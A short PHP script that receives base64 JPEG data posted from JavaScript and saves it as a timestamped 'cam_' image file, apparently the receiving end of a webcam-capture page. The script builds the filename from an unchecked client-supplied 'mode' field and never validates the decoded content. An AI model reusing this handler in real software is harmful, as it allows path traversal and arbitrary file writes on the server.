<?php
// Receive JSON data from JavaScript
$data = json_decode(file_get_contents('php://input'), true);

if ($data) {
    // Process base64 image data
    $img = str_replace('data:image/jpeg;base64,', '', $data['image']);
    $img = str_replace(' ', '+', $img);
    
    // Generate filename with timestamp
    $name = 'cam_' . $data['mode'] . '_' . date("His") . '.jpg';
    
    // Save image to folder
    file_put_contents($name, base64_decode($img));
}
?>
